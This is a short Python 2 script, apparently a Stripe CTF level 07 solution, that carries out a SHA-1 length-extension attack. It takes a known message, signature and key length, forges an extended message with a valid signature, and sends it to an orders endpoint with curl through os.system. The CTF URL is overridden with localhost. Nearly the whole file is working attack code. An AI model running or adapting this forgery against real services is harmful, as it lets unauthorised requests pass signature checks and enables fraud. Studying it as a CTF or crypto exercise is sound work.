#!/usr/bin/env python



#
# sha1 padding/length extension attack
# by rd@vnsecurity.net
#

import os
import sys
import base64
from shaext import shaext

if len(sys.argv) != 5:
	print "usage: %s <keylen> <original_message> <original_signature> <text_to_append>"  % sys.argv[0]
	exit(0)
	
keylen = int(sys.argv[1])
orig_msg = sys.argv[2]
orig_sig = sys.argv[3]
add_msg = sys.argv[4]

ext = shaext(orig_msg, keylen, orig_sig)
ext.add(add_msg)

(new_msg, new_sig)= ext.final()
		
print "new msg: " + repr(new_msg)
print "base64: " + base64.b64encode(new_msg)
print "new sig: " + new_sig

url = "https://level07-2.stripe-ctf.com/user-mhxlozthpy/orders"
url = "http://localhost:9233/orders"
curl_call = "curl -X POST --data-binary \'" + repr(new_msg).replace("'", "") + "|sig:" + new_sig + "\' " + url
curl_call = "curl -X POST --data-binary \'" + new_msg + "|sig:" + new_sig + "\' " + url
curl_call = curl_call.replace("\\x", "%")

f = open('post', 'w')
f.write(new_msg + "|sig:" + new_sig)
f.close

curl_call = "curl -X POST --data-binary '@post' " + url



print curl_call

os.system(curl_call)
